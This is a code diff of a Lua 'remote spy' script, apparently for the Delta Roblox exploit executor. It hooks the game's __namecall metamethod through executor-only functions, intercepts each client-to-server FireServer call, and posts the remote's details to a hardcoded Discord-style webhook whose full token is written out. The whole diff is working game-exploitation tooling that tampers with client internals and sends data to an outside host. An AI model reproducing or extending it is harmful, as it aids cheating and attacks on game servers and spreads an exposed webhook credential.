@@ -1,57 +1,51 @@
--- Delta Remote Spy
-task.wait(0.5)
+task.wait(1)
 
-local success, err = pcall(function()
-    local webhook = "https://hooks.hyra.io/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
+local WebhookURL = "https://hooks.hyra.io/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
+
+-- Verify environment functions exist
+local gmt = getrawmetatable or getmetatable
+local sro = setreadonly or make_writeable
+local req = request or http_request or (http and http.request)
+
+if not gmt or not sro then
+    print("Delta Error: Metatable functions not supported in this version.")
+    return
+end
+
+local mt = gmt(game)
+local oldNamecall = mt.__namecall
+
+sro(mt, false)
+
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
     
-    -- Detect Delta's request function
-    local req = (type(request) == "function" and request) or (type(http_request) == "function" and http_request)
-    
-    if not req then 
-        warn("Delta: HTTP request function not found.")
-        return 
-    end
-
-    local mt = getrawmetatable(game)
-    local old = mt.__namecall
-    setreadonly(mt, false)
-
-    mt.__namecall = newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-        local args = {...}
+    -- Filter: Only Client-to-Server and not internal calls
+    if method == "FireServer" and not checkcaller() then
+        local name = self.Name
         
-        -- Only Client -> Server
-        if method == "FireServer" then
-            local path = self:GetFullName()
-            
-            -- Argument Logger
-            local formatted = ""
-            for i, v in ipairs(args) do
-                formatted = formatted .. string.format("[%d] = %s (%s)\n", i, tostring(v), typeof(v))
-            end
-
-            task.spawn(function()
-                req({
-                    Url = webhook,
+        task.spawn(function()
+            if req then
+                local data = {
+                    Url = WebhookURL,
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = game:GetService("HttpService"):JSONEncode({
-                        ["embeds"] = {{
-                            ["title"] = "📤 Outgoing Request (Client -> Server)",
-                            ["description"] = "```lua\n" .. path .. ":FireServer()\n
-```",
-                            ["fields"] = {{["name"] = "Data", ["value"] = "```lua\n" .. (formatted ~= "" and formatted or "None") .. "```"}},
-                            ["color"] = 3066993
+                        embeds = {{
+                            title = "📤 Outgoing Remote",
+                            description = "Remote Name: `" .. name .. "`",
+                            color = 0x00FF00
                         }}
                     })
-                })
-            end)
-        end
-        return old(self, ...)
-    end)
-    setreadonly(mt, true)
+                }
+                req(data)
+            end
+        end)
+    end
+    
+    return oldNamecall(self, ...)
 end)
 
-if not success then
-    warn("Execution Error: " .. tostring(err))
-end
+sro(mt, true)
+print("Spy Active - Monitoring Outgoing Remotes")
